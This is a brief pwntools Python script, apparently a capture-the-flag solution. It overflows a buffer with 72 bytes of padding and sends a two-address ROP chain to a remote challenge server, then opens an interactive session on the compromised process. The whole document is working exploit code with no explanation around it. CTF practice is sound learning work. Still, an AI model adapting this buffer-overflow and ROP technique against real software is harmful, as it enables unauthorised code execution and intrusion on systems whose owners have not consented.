from pwn import *

exe = context.binary = ELF("./chall")
# r = process()
r = remote("chal.78727867.xyz",9999)
# r = remote("127.0.0.1", 9999)
offset = 72
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.raw(0x000000000040128f)
rop.raw(0x4011b6)
sleep(10)
r.sendline(rop.chain())
r.interactive()
